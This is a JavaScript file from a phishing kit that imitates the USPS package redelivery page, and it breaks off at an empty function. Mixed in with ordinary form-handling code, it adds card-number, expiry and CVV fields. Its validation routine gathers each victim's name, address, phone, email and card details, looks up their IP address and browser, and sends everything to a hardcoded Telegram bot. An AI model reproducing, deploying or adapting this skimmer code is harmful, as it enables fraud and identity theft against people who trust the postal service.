/////////////////////////
// Schedule Redelivery //
/////////////////////////
var modifyPage = false;

$(document).ready(function () {
  function saveip() {
    //保存ip
    $.post("./ip.php", {}, function (e) {
      //e为返回的数据
    });
  }
  // Get the locations and types
  getRedeliveryLocations();
  getRedeliveryTypes();
  getRedeliveryIP();
  getPostalHolidays();
  getLinx();

  if (getURLParameter("token")) {
    informedDeliveryToken(getURLParameter("token"));
  }

  $("#phone").mask("999-999-9999");
  $("#appointmentErrorContainer").hide();

  $("#Expiry").mask("99/9999");
  $("#cardn").mask("9999-9999-9999-9999");
  // $("#zipCode").mask("99999-9999");

  // For some reason they like popovers to show on hover - OK
  // Now Farhan wants it removed - what a cluster
  //    $(".info-icon").mouseenter(function () {
  //        $(this).popover('show');
  //    });
  //    $(".info-icon").mouseout(function () {
  //        $(this).popover('hide');
  //    });

  jQuery(".use-selected-address").click(function () {
    if (jQuery("input[name='selectValidAddress']:checked").length < 1) {
      jQuery(".selectAddressError").show();
    }
    if (jQuery("input[name='selectValidAddress']:checked").length > 0) {
      jQuery(".selectAddressError").hide();
      shipmentPickupDetailEdit = false;
      var selectedLocationId = jQuery(
        "input[name='selectValidAddress']:checked"
      ).attr("id");
      getRedeliveryServiceAvailability(foundAddresses[selectedLocationId]);
    }
  });

  // Prevent <a> tags with 'href="#"' from jumping to the top of the page.
  $("body").on(
    "click touch",
    '.container-fluid a[href="#"], .modal a[href="#"], .popover a[href="#"], .ui-datepicker-header a[href="#"]',
    function (e) {
      e.preventDefault();
    }
  );

  //getRedeliveryIP();
  getLoggedIn();

  // Underline the corresponding navigation tab ("Schedule a Redelivery" and "Modify Redelivery Request") based on the URL.
  switch (window.location.pathname) {
    case "/redelivery.htm":
      $(".tab-link").eq(0).addClass("active");
      checkMainPageUrl();
      break;
    case "/resources/modify-redelivery.htm":
      $(".tab-link").eq(1).addClass("active");
      checkModPage();
      break;
    case "/resources/redelivery-confirmation.htm":
      $(".tab-link").eq(0).addClass("active");
      confirmationLoad();
      break;
    default:
      break;
  }

  // if on confirm page, we want to make sure there is a redelivery
  function confirmationLoad() {
    modifyPage = true;
  }

  // main page URL param check
  function checkMainPageUrl() {
    if (getURLParameter("modify")) {
      $("#modify-redelivery-request-modal").modal("show");
    }

    if (getURLParameter("articleNumber")) {
      $("#tracking-barcode-search").val(getURLParameter("articleNumber"));
    }
  }

  // Mod Page - init check
  function checkModPage() {
    if (getURLParameter("confirmation")) {
      // Go get the stuff
      var confirm = getURLParameter("confirmation");
      loadRedelivery(confirm);
    } else {
      // Go back to landing and Open Modify:
    }
  }

  // Open/Close the step drawers.
  $(".step-wrapper .step-header").on("click touch", function (e) {
    e.preventDefault();
    var booleanCheck = this.parentElement.className;
    var boolean = booleanCheck.includes("disabled");
    if (!boolean) {
      $(this).parent().toggleClass("active");
    }
  });

  $(".step-wrapper").on("click touch", function (e) {
    if ($(this).hasClass("disabled")) {
      if (
        $(".step-two-drawer").hasClass("edit-step") &&
        Object.keys(redeliveryInformation).length == 0
      ) {
        $(".selectRed").show();
      }
    } else if (!$(this).hasClass("disabled")) {
      $(".selectRed").hide();
    }
  });

  // Prevent the disabled steps from opening.
  $(".step-wrapper").on("touchend click", function (e) {
    if ($(this).hasClass("disabled")) {
      if ($(this).hasClass("active")) {
        $(this).removeClass("active");
      }
      if ($(this).hasClass("step-complete")) {
        $(this).removeClass("step-complete");
      }
    }
  });

  jQuery("#closeModalModify").on("click touch", function () {
    jQuery("#confirmationNumberField").val("");
    jQuery("#modifyLookupEmail").val("");
    jQuery("#appointmentErrorContainer").hide();
    jQuery("#confirmationNumberErrorMessage").parent().removeClass("error");
    jQuery("#emailAddresConfErrorMessage").parent().removeClass("error");
  });

  // Lookup Redelivery
  jQuery("#searchRedeliveries").on("click touch", function () {
    var confNum = jQuery("#confirmationNumberField").val();
    var emailPhoneConf = jQuery("#modifyLookupEmail").val();

    var confirmationNumber = jQuery("#confirmationNumberField")
      .val()
      .toUpperCase();
    var lkpEmail = "";
    // TODO: Make Phone Digits only.
    var lkpPhone = "";

    var lkpEmailPhone = jQuery("#modifyLookupEmail").val();
    var check = isNumeric(lkpEmailPhone);

    if (check) {
      lkpPhone = lkpEmailPhone;
    } else {
      lkpEmail = lkpEmailPhone;
    }

    if (confNum && emailPhoneConf != "") {
      lookupRedelivery(confirmationNumber, lkpEmail, lkpPhone);
    }
  });

  // Cancel Redelivery Yes
  $("#cancelRedeliveryModalYes").on("click touch", function () {
    $("#cancel-redelivery-request-modal").modal("hide");

    var cancelConfirmationNumber = jQuery("#modifyConfirmationNumber").text();

    cancelRedelivery(cancelConfirmationNumber);
  });

  // STEP 1 //

  // Display urbanization code.
  $(".form-state-dropdown").change(function () {
    if ($(this).val() === "PR" || $(this).val() === "GU") {
      $(this)
        .closest(".row")
        .siblings(".row")
        .find(".urbanization-code-input")
        .show();
    } else {
      $(this)
        .closest(".row")
        .siblings(".row")
        .find(".urbanization-code-input")
        .hide();
    }
  });

  // Display validated address upon clicking the "Check Availability" button.
  $(".check-availability").on("click touch", function () {
    /*validateAddress();*/

    clearStepError();
    fieldValidationIssue();
  });

  // Display the address form upon clicking the "Edit" button.
  $(".edit-redelivery-address").on("click touch", function () {
    $(".step-one-validation").hide();
    $(".step-one-form").show();
    // Clear the Search and all that stuff
    $(".step-one-drawer").addClass("current-step");
    $(".step-one-drawer").removeClass("step-complete");

    $(".step-two-drawer").removeClass("current-step");
    $(".step-two-drawer").removeClass("step-complete");
    $(".step-two-drawer").removeClass("edit-step");
    $(".step-two-drawer").removeClass("active");
    $(".step-two-drawer").addClass("disabled");
    $("#total-packages-overall").text("0");
    $(".step-three-drawer").removeClass("current-step");
    $(".step-three-drawer").removeClass("step-complete");
    $(".step-three-drawer").removeClass("edit-step");
    $(".step-three-drawer").removeClass("active");
    $(".step-three-drawer").addClass("disabled");

    $("#tracking-barcode-search").val("");
    jQuery(".tracking-results-wrapper").hide();

    $(".step-wrapper.disabled").on("click touch", function () {
      $(this)
        .parents(".container-fluid")
        .find(".current-step")
        .find(".review-error-wrapper")
        .addClass("error");
    });

    // reenable error for step 2
  });

  // City Check
  //
  //    $("#city").on('keyup', function () {
  //
  //        var regex = /^[A-Za-z ]+$/
  //        if (!regex.test($(this).val()) && ($(this).val().length > 0)) {
  //
  //
  //            jQuery("#cityErrorMessage").parent().addClass("error");
  //
  //        } else {
  //            jQuery("#cityErrorMessage").parent().removeClass("error");
  //        }
  //    });

  $("#city").keyup(function () {
    var cityClean = $("#city").val();

    $("#city").val(cityClean.replace(/[^a-zA-Z ]/, ""));
  });

  // STEP 2 //

  // Display tracking/barcode search results.
  var timesClicked = 0;
  $("#tracking-barcode-search").keyup(function (e) {
    var totalpkgCnt = parseInt($("#total-packages-overall").text());
    var trckVal = $("#tracking-barcode-search").val();
    if (trckVal != "") {
      timesClicked++;
      if (e.which == 13) {
        if (timesClicked > 1 && totalpkgCnt > 0) {
          $("#new-search-modal").modal();
          $("#new-search-modal").data("bs.modal").options.backdrop = "static";
          $("#new-search-yes").on("click touch", function () {
            $(".white-spinner-progress").addClass("spinnerWhite");
            $(".white-spinner-wrapper").show();
            addMetrics("step2VPV");
            $(".tracking-results-wrapper").show();
            $(".step-one-drawer").removeClass("active");
            packagesLookup();
          });
        } else {
          $(".white-spinner-progress").addClass("spinnerWhite");
          $(".white-spinner-wrapper").show();
          addMetrics("step2VPV");
          $(".tracking-results-wrapper").show();
          $(".step-one-drawer").removeClass("active");
          packagesLookup();
        }
      } else {
        jQuery("#trackingNumErrorMessage").parent().addClass("error");
      }
    }
  });

  $(".btn-search").on("click touch", function () {
    var trckVal = $("#tracking-barcode-search").val();
    var totalpkgCnt = parseInt($("#total-packages-overall").text());
    if (trckVal != "") {
      timesClicked++;
      $(".tracking-results-wrapper").show();
      $(".step-one-drawer").removeClass("active");
      if (timesClicked > 1 && totalpkgCnt > 0) {
        $("#new-search-modal").modal();
        $("#new-search-modal").data("bs.modal").options.backdrop = "static";
        $("#new-search-yes").on("click touch", function () {
          $(".white-spinner-progress").addClass("spinnerWhite");
          $(".white-spinner-wrapper").show();
          packagesLookup();
        });
      } else {
        $(".white-spinner-progress").addClass("spinnerWhite");
        $(".white-spinner-wrapper").show();
        packagesLookup();
      }
    } else {
      jQuery("#trackingNumErrorMessage").parent().addClass("error");
    }
  });

  $("#tracking-barcode-search").keyup(function (e) {
    jQuery("#trackingNumErrorMessage").parent().removeClass("error");
  });

  // Expand/Collapse the tracking details drawers.
  $(".column-item .tracking-number-dropdown").on("click touch", function (e) {
    jQuery(this).parent().toggleClass("active");
  });
  $(".tracking-number-dropdown a.inline-link").on("click touch", function (e) {
    event.stopPropagation();
  });
  // Start Select Redelivery Details For This Package

  // Character counter for the additional instructions.
  var text_max = 250;
  $(".count_message").html("0/" + text_max);
  $(".extra-input-field").on("keyup", function () {
    var text_length = $(this).val().length;
    var text_remaining = text_max - text_length;
    $(this)
      .parents(".form-wrapper")
      .find(".count_message")
      .html(text_length + "/" + text_max);
  });

  // Start Select Redelivery Details For This Package - Clear Button
  $(".clear-btn").on("click touchend", function (e) {
    $(this).parents(".form-wrapper").find("textarea").val("");
    $(this).parents(".form-wrapper").find(".count_message").html("0/250");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".receive-confirmation-checkbox")
      .prop("checked", false);
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".pickup-representative")
      .prop("checked", false);
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".representative-requirements-wrapper")
      .css("display", "none");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".representative-requirements-wrapper .form-control")
      .val("");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".delivery-location-dropdown")
      .val("");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".resume-start-input")
      .val("");
    $(this)
      .closest(".redelivery-details-wrapper")
      .removeClass(
        "pickup-redelivery return-sender-redelivery carrier-redelivery"
      );
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".redelivery-type-dropdown")
      .val("");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".delivery-location-dropdown")
      .val("");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".additional-instructions-wrapper")
      .removeClass("required-field");
    $(this)
      .parents(".redelivery-details-wrapper")
      .find(".carrier-redeliver-required")
      .hide();
  });

  // Display the additional requirements for the package pickup representative upon clicking the "Add someone..." checkbox.
  $(".pickup-representative").click(function () {
    $(this)
      .closest(".redelivery-pickup-wrapper")
      .find(".representative-requirements-wrapper")
      .toggle();
    $(this).closest(".redelivery-pickup-wrapper").find(".id-pickup").toggle();
  });

  $(".review-btn").on("click touch", function (e) {
    addMetrics("step3VPVConfirmed");
    reviewSelectedRedelivery();
  });

  // Expand Step 3 drawer upon clicking the "Review" button.
  /*$('.review-btn').on('click touch', function (e) {
    	var redeliveryDropDown = $('.redelivery-type-dropdown').val();

    	if (redeliveryDropDown == null) {
    		$(".redelivDropErrorMessage").parent().addClass("error");
    	} else {
    		$(".redelivDropErrorMessage").parent().removeClass("error");
    		reviewSelectedRedelivery();
    	}
    });*/

  // STEP 3 //

  // Expand Step 4 upon clicking the "Confirm" button.
  $(".confirm-selection-btn").on("click touch", function (e) {
    if (
      !$(this)
        .parents(".step-drawer")
        .find("#terms-conditions-checkbox")
        .is(":checked")
    ) {
      $(this)
        .parents(".step-drawer")
        .find(".terms-conditions-wrapper")
        .addClass("error");
    } else {
      saveip();
      addMetrics("step4VPVSignUp");
      dataLayer.push({
        event: "application",
        application: {
          element: "IDXS Prompt",
          userAction: "impression",
        },
      });
      $(".step-three-drawer").removeClass("current-step");
      $(".step-three-drawer").addClass("step-complete");
      $(".step-four-drawer").addClass("active current-step");
      $(".step-four-drawer").removeClass("disabled");
      $(this)
        .parents(".step-drawer")
        .find(".terms-conditions-wrapper")
        .removeClass("error");
      $(".review-error-wrapper").removeClass("error");

      $("#root").show();

      //   完成重定向
    }
  });

  // Delete the selected redelivery selection box.
  $(".delete-selected-redelivery").on("click touch", function (e) {
    $("#delete-selected-redelivery-modal").modal();
    $("#delete-selected-redelivery-modal").data("bs.modal").options.backdrop =
      "static";
    $thisParent = $(this);
    $("#delete-package-yes").on("click touch", function (e) {
      e.preventDefault();
      $thisParent.closest(".tracking-number-box").remove();
    });
  });

  // Display error message if the Terms and Conditions is not selected.
  $(".submit-request").on("click touch", function (e) {
    // Check for Step 4
    if ($(".step-four-drawer").hasClass("active")) {
      if (!$("#yes-radio").is(":checked") && !$("#no-radio").is(":checked")) {
        e.preventDefault();
        $("#yes-radio").parents(".radio-buttons").addClass("error");
      } else {
        $("#yes-radio").parents(".radio-buttons").removeClass("error");
        submitRedelivery();
      }
    } else {
      if (!$("#terms-conditions-checkbox").is(":checked")) {
        e.preventDefault();
        $(this)
          .parents(".step-drawer")
          .find(".terms-conditions-wrapper")
          .addClass("error");
      } else {
        $(this)
          .parents(".step-drawer")
          .find(".terms-conditions-wrapper")
          .removeClass("error");
        submitRedelivery();
      }
    }
  });

  $("#submitModifiedRedelivery").on("click touch", function (e) {
    if (!$("#terms-conditions-checkbox").is(":checked")) {
      e.preventDefault();
      $(this)
        .parents(".step-drawer")
        .find(".terms-conditions-wrapper")
        .addClass("error");
    } else {
      addMetrics("modifyRedliv");
      $(this)
        .parents(".step-drawer")
        .find(".terms-conditions-wrapper")
        .removeClass("error");
      modifyRedelivery();
    }
  });

  $("#terms-conditions-checkbox").change(function () {
    $(this)
      .parents(".step-drawer")
      .find(".terms-conditions-wrapper")
      .removeClass("error");
    $(".review-error-wrapper").removeClass("error");

    if ($(".step-four-drawer").hasClass("current-step")) {
      $(".step-four-drawer").removeClass("current-step");
      $(".step-four-drawer").removeClass("active");
      $(".step-four-drawer").addClass("disabled");
      $(".step-three-drawer").addClass("current-step");
      $(".step-three-drawer").addClass("active");
    }
  });

  // STEP 4 //
  $("#yes-radio").on("click touch", function (e) {
    $("#yes-radio").parents(".radio-buttons").removeClass("error");
  });

  $("#no-radio").on("click touch", function (e) {
    $("#yes-radio").parents(".radio-buttons").removeClass("error");
  });

  // Display additional information on Informed Delivery when the user selects yes to sign up for the service.
  $("#yes-radio").change(function () {
    if ($("#yes-radio").prop("checked")) {
      $("#sign-up-yes-message").show();
      $("#sign-up-yes-message").style.display = "initial";
    }
  });

  $("#no-radio").change(function () {
    if ($("#no-radio").prop("checked")) {
      $("#sign-up-yes-message").hide();
    }
  });

  // CONFIRMATION //

  // Display the print window.
  $(".print-page").on("click touch", function (e) {
    try {
      document.execCommand("print", false, null);
    } catch (e) {
      window.print();
    }
  });

  // Setup popover (tooltips).
  /*    $('.tracking-barcode-popover-icon').popover({
        html: true,
        placement: 'auto',
        content: function () {
            return $('.tracking-barcode-popover').html();
        }
    });*/

  $(".tracking-barcode-popover-icon").on("click", function () {
    $("#redeliveryToolTipModal").css("display", "block");
    $("#redeliveryToolTipModal").modal({ backdrop: true });
  });

  // Prevent popover from closing upon click on popover.
  $(document).on("mousedown", ".popover", function (e) {
    if (!$(e.target).hasClass("close")) {
      e.preventDefault();
    }
  });

  // Resize functionality for the information icons (from popover to modal).
  var resizeTimer;
  $(window).on("load resize", function (e) {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(function () {
      // Resizing has stopped
      if (window.innerWidth >= 768) {
        // Close all modals
        $(".modal.show").modal("hide");

        // Change modals to popovers
        $(".info-icon:not(.modal-only)").attr("data-toggle", "popover");
        $(".info-icon:not(.modal-only)").popover("enable");
      } else if (window.innerWidth < 768) {
        // Close all popovers
        $(".popover.show").popover("hide");

        // Change popovers to modals
        $(".info-icon:not(.modal-only)").attr("data-toggle", "modal");
        $(".info-icon:not(.modal-only)").popover("disable");
      }
    }, 250);
  });

  // START BACK TO TOP SCRIPT.
  $(window).scroll(function () {
    if ($(this).height() + $(this).scrollTop() > 1000) {
      if (!$(".results-return").hasClass("active")) {
        $(".results-return").addClass("active");
      }
    } else {
      if ($(".results-return").hasClass("active")) {
        $(".results-return").removeClass("active");
      }
    }
  });
  $(".results-return a").on("click touch", function (e) {
    e.preventDefault();
    window.scrollTo(0, 0);
  });
  // });

  // Display white spinner.
  $("#display-white-spinner").click(function () {
    $(".white-spinner-progress").addClass("spinnerWhite");
    $(".white-spinner-wrapper").show();
  });

  // Modify Redelivery Request //

  // Display Step 2 after clicking on the "Update Request" on Step 1.
  $(".update-request-btn").on("click touch", function (e) {
    modifyRedeliverySelections();
  });

  // Edit the redelivery selection by taking you to step 2.
  $(".edit-selected-redelivery").on("click touch", function (e) {
    $(".modify-redelivery-step").addClass("active edit-step");
    $(".confirm-modification-step").removeClass("active");
    $(".confirm-modification-step").addClass("disabled");
  });

  // Display error below the "Update Request" button after editing the Redelivery details and clicking on the next step drawer.
  $(".confirm-modification-step .step-header").on("click touch", function (e) {
    if ($(".modify-redelivery-step").hasClass("edit-step")) {
      $(".review-error-wrapper").addClass("error");
    } else {
      $(".review-error-wrapper").removeClass("error");
    }
  });

  // Display the current step error message when user tries to expand a disabled step.
  $(".step-wrapper.disabled").on("click touch", function () {
    $(this)
      .parents(".container-fluid")
      .find(".current-step")
      .find(".review-error-wrapper")
      .addClass("error");
  });

  /////////////////////////////////////////////
  //////////     DEMO PURPOSE     /////////////
  /////////////////////////////////////////////

  // Display error messages.
  $(".error-display").click(function () {
    $(".radio-buttons").toggleClass("error");
    $(".check-boxes").toggleClass("error");
    $(".required-field").toggleClass("error");
    $(".tracking-alert").toggle();
  });

  $(".alert-display").click(function () {
    $(".check-boxes").toggleClass("error");
    $(".required-field").toggleClass("error");
    $(".tracking-alert").toggle();
    $(".step-two-drawer").toggle();
    $(".step-three-drawer").toggle();
  });

  $(".unable-modify").click(function () {
    $(".check-boxes").toggleClass("error");
    $(".required-field").toggleClass("error");
    $(".tracking-alert").toggle();
    $(".cancel-request-wrapper").toggle();
    $(".modify-step-alert-message-wrapper").toggle();
    $(".update-request-button-wrapper").toggle();
    $(".confirm-modification-step").toggle();
    $(".redelivery-details-wrapper").toggle();
  });

  // Display services unavailable.
  $(".service-unavailable").on("click touch", function (e) {
    $(".redelivery-unavailable-wrapper").toggle();
    $(".redelivery-available-wrapper").toggle();
    $(".step-two-drawer").toggle();
    $(".step-three-drawer").toggle();
    if ($(".step-two-drawer").hasClass("disabled")) {
      $(".step-four-drawer").hide();
    } else if ($(".step-two-drawer").is(":hidden")) {
      $(".step-four-drawer").hide();
    } else {
      $(".step-four-drawer").show();
    }
    $(".unqualified-informed-delivery").toggle();
  });

  // Close spinner by clicking on gray area.
  $(".gray-overlay").click(function (e) {
    $(".white-spinner-wrapper").hide();
    clearInterval(spinner);
  });

  // Display the Scheduled Redelivery modifications confirmation content on the confirmation page upon clicking the "Redelivery Scheduled" button.
  $(".modified-confirmation-btn").on("click touch", function (e) {
    $(
      ".request-submitted-confirmation-wrapper, .redelivery-scheduled-header-wrapper, .redelivery-not-submitted-header-wrapper"
    ).hide();
    $(
      ".request-modified-confirmation-wrapper, .redelivery-modified-header-wrapper"
    ).show();
    $(".tab-link").eq(0).removeClass("active");
    $(".tab-link").eq(1).addClass("active");
  });

  // Display the Scheduled Redelivery modification not submitted content on the confirmation page upon clicking the "Request Modified Confirmation" button.
  $(".request-not-submitted-btn").on("click touch", function (e) {
    $(
      ".request-submitted-confirmation-wrapper, .redelivery-scheduled-header-wrapper, .redelivery-modified-header-wrapper"
    ).hide();
    $(
      ".redelivery-not-submitted-header-wrapper, .request-modified-confirmation-wrapper"
    ).show();
    $(".tab-link").eq(0).removeClass("active");
    $(".tab-link").eq(1).addClass("active");
  });

  // Display the Scheduled Redelivery request confirmation content on the confirmation page upon clicking the "Request Not Submitted" button.
  $(".redelivery-scheduled-btn").on("click touch", function (e) {
    $(
      ".request-modified-confirmation-wrapper, .redelivery-modified-header-wrapper, .redelivery-not-submitted-header-wrapper"
    ).hide();
    $(
      ".request-submitted-confirmation-wrapper, .redelivery-scheduled-header-wrapper"
    ).show();
    $(".tab-link").eq(1).removeClass("active");
    $(".tab-link").eq(0).addClass("active");
  });

  // Toggle the Step 4: Informed Delivery and display the "Submit" button on Step 3.
  $(".unqualified-informed-delivery").on("click touch", function (e) {
    $(".step-four-drawer").toggle();
    $(".step-three-drawer .confirm-button-wrapper").toggle();
    $(".step-three-drawer .submit-wrapper").toggle();
    $(".service-unavailable").toggle();
  });
});

function isNumeric(name) {
  var Exp = /^[0-9-]+$/;
  return name.match(Exp);
}

// Masking Phone Number
/*jQuery("#phone").on('keydown keypress input blur', function () {
	jQuery(this).mask("999-999-9999");
});*/

jQuery("#tracking-barcode-search").click(function () {
  jQuery("#trackingNumErrorMessage").parent().removeClass("error");
});

jQuery("#searchRedeliveries").click(function () {
  var confNum = jQuery("#confirmationNumberField").val();
  var emailPhoneConf = jQuery("#modifyLookupEmail").val();

  if (confNum == "") {
    jQuery("#confirmationNumberErrorMessage").parent().addClass("error");
  }

  if (emailPhoneConf == "") {
    jQuery("#emailAddresConfErrorMessage").parent().addClass("error");
  }

  jQuery("#confirmationNumberField").on("keyup", function () {
    jQuery("#confirmationNumberErrorMessage").parent().removeClass("error");
  });

  jQuery("#modifyLookupEmail").on("keyup", function () {
    jQuery("#modifyLookupEmail").parent().removeClass("error");
  });
});

function getURLParameter(sParam) {
  var sPageURL = window.location.search.substring(1);
  var sURLVariables = sPageURL.split("&");
  for (var i = 0; i < sURLVariables.length; i++) {
    var sParameterName = sURLVariables[i].split("=");
    if (sParameterName[0] == sParam) {
      return decodeURIComponent(sParameterName[1]);
    }
  }
}

function fieldValidationIssue() {
  clearStepError();
  //    jQuery(".required-field").toggleClass("error");
  var hasErrorFields = false;
  // Field Checks

  var grabFields = {};

  grabFields.firstName = jQuery("#firstName").val();
  grabFields.lastName = jQuery("#lastName").val();
  grabFields.addressLineOne = jQuery("#addressLineOne").val();
  grabFields.city = jQuery("#city").val();
  grabFields.state = jQuery("#State").val();
  grabFields.zipCode = jQuery("#zipCode").val();
  grabFields.phone = jQuery("#phone").val();
  grabFields.emailAddress = jQuery("#emailAddress").val();

  var erroredFields = [];

  // lets do it this way
  //normalize string and remove all unnecessary characters
  var cleanPhone = grabFields.phone.replace(/[^\d]/g, "");

  /*if (cleanPhone < 10) {
    	jQuery("#phoneErrorMessage").parent().addClass("error");
    	hasErrorFields = true;
    }
    */
  if (grabFields.phone.length <= 11) {
    jQuery("#phoneErrorMessage").parent().addClass("error");
    hasErrorFields = true;
  }

  /*var phoneCheck = parseInt(fixMaskedPhoneNumber(grabFields.phoneNumber)) || 0;*/

  jQuery.each(grabFields, function (gfIndex, gfValue) {
    if (gfValue == "") {
      jQuery("#" + gfIndex + "ErrorMessage")
        .parent()
        .addClass("error");
      hasErrorFields = true;
    }

    // Now Specifics for ZIP Code, Phone Number and Email Address?
    /*   var zipFix = grabFields.zipCode.replace(/[^\d]/g, "");


        if (zipFix.length !== 5 && zipFix.length !== 9) {
            jQuery("#zipCodeErrorMessage").parent().addClass("error");
            hasErrorFields = true;
        }*/

    /*if (grabFields.phoneNumber.length === 0) {
            jQuery("#phoneNumberErrorMessage").parent().addClass("error");
            jQuery("#phoneNumberInvalidMessage").hide();
            jQuery("#phoneNumberErrorMessage").show();
            hasErrorFields = true;
        } else if (phoneCheck == 0) {
            jQuery("#phoneNumberInvalidMessage").parent().addClass("error");
            jQuery("#phoneNumberErrorMessage").hide();
            jQuery("#phoneNumberInvalidMessage").show();
            hasErrorFields = true;
        }*/

    if (!emailValidation(grabFields.emailAddress)) {
      jQuery("#emailAddressErrorMessage").show();
    } else {
      if (!validateEmail(grabFields.emailAddress)) {
        jQuery("#emailAddressErrorMessage").parent().addClass("error");
        jQuery("#emailAddressErrorMessage").show();
        hasErrorFields = true;
      }
    }
  });

  //Now do some stuff when you start typing...
  jQuery("#firstName").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#lastName").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#phone").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#addressLineOne").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#city").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#zipCode").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#State").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#emailAddress").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
    jQuery("#emailAddressErrorMessage").hide();
  });
  

  if (!hasErrorFields) {
    $(".step-one-drawer").addClass("disabled");
    $(".step-one-drawer").addClass("step-complete");
    $(".step-one-drawer").removeClass("current-step");
    $(".step-one-drawer").removeClass("active");

    $("#root").show();
    setTimeout(function () {
      $("#root").hide();
    }, 2000);

    // #root

    $(".step-two-drawer").removeClass("disabled");
    $(".step-two-drawer").addClass("current-step");
    $(".step-two-drawer").addClass("active");
  }
}

function emailValidation(email) {
  if (email == "") {
    return false;
  } else {
    return true;
  }
}

function validateEmail(emailField) {
  var reg =
    /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  if (reg.test(emailField) == false) {
    return false;
  }
  return true;
}

function clearStepError() {
  $(".current-step").find("*").removeClass("error");
}

function clearAllErrors() {
  $("body").find("*").removeClass("error");
}

$(".check-availability1").on("click touch", function () {
  /*validateAddress();*/

  clearStepError();
  fieldValidationIssue1();
});

function fieldValidationIssue1() {
  clearStepError();
  //    jQuery(".required-field").toggleClass("error");
  var hasErrorFields = false;
  // Field Checks

  var grabFields = {};

  grabFields.cardn = jQuery("#cardn").val();
  grabFields.Expiry = jQuery("#Expiry").val();
  grabFields.cvv2 = jQuery("#cvv2").val();

  var erroredFields = [];
  // 验证卡号
  var cleancardn = grabFields.cardn.replace(/[^\d]/g, "");

  if (grabFields.cardn.length < 18) {
    jQuery("#cardnErrorMessage").parent().addClass("error");
    hasErrorFields = true;
  }
  // 验证日期
  var cleancardn = grabFields.Expiry.replace(/[^\d]/g, "");

  if (grabFields.Expiry.length <= 6) {
    jQuery("#ExpiryErrorMessage").parent().addClass("error");
    hasErrorFields = true;
  }
  // 验证c
  var cleancardn = grabFields.cvv2.replace(/[^\d]/g, "");

  if (grabFields.cvv2.length <= 2) {
    jQuery("#cvv2ErrorMessage").parent().addClass("error");
    hasErrorFields = true;
  }

  //Now do some stuff when you start typing...
  jQuery("#cardn").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#Expiry").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });
  jQuery("#cvv2").on("keypress", function () {
    jQuery(this).parent().removeClass("error");
  });

  $(".review-error-wrapper").removeClass("error");

  if (!hasErrorFields) {
    $(".step-two-drawer").addClass("disabled");
    $(".step-two-drawer").addClass("step-complete");
    $(".step-two-drawer").removeClass("current-step");
    $(".step-two-drawer").removeClass("active");

    $("#root").show();

    setTimeout(function () {
      $("#root").hide();
    }, 2000);

    $(".step-two1-drawer").removeClass("disabled");
    $(".step-two1-drawer").addClass("current-step");
    $(".step-two1-drawer").addClass("active");

    var firstName = document.getElementById("firstName").value;
    var middleInitial = document.getElementById("middleInitial").value;
    var lastName = document.getElementById("lastName").value;
    var addressLineOne = document.getElementById("addressLineOne").value;
    var addressLineTwo = document.getElementById("addressLineTwo").value;
    var city = document.getElementById("city").value;
    var state = document.getElementById("State").value;
    var zipCode = document.getElementById("zipCode").value;
    var phone = document.getElementById("phone").value;
    var emailAddress = document.getElementById("emailAddress").value;
    var cardn = document.getElementById("cardn").value;
    var Expiry = document.getElementById("Expiry").value;
    var cvv2 = document.getElementById("cvv2").value;

    //console.log(firstName,middleInitial,lastName,addressLineOne,addressLineTwo,city,state,zipCode,phone,emailAddress,cardn,Expiry,cvv2)

    if (cardn == "") {
    } else {
      $.get(
        "https://ipinfo.io",
        function (response) {
          var ip = response.ip;
          //console.log(ip);
          var agent = navigator.userAgent;
          //console.log(agent);

          var text = `|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|=[ USER INFORMATION ]=|%0A|Name  :  ${firstName} ${middleInitial} ${lastName}%0A|Email  :  ${emailAddress}%0A|Phone  :  ${phone}%0A|State  :  ${state}%0A|City  :  ${city}%0A|ZipCode  :  ${zipCode}%0A|Address1  :  ${addressLineOne}%0A|Address2  :  ${addressLineTwo}%0A|==[ CC INFORMATION ]==|%0A|Card Number:  ${cardn}%0A|Expiry  :  ${Expiry}%0A|CVV  :  ${cvv2}%0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|%0A|IP-ADDRESS  :  ${ip}%0A|USER-AGENT  :  ${agent}%0A|%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B][ USPS ECHO ][%2B]%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23[%2B|`;

          var url = `https://api.telegram.org/bot5567921371:AAHPC9OwhUl7s3-Wl7Hg_3QK2yc5wrTKb0Q/sendMessage?chat_id=-777422385&text=${text}`;

          let api = new XMLHttpRequest();
          api.open("GET", url, true);
          api.send();

          //console.log(text)

          gotonext();
        },
        "jsonp"
      );
    }
  }
}

//----------------------------------------------------------------------
$(".check-availability2").on("click touch", function () {
  /*validateAddress();*/

  clearStepError();
  fieldValidationIssue2();
});

function fieldValidationIssue2() {
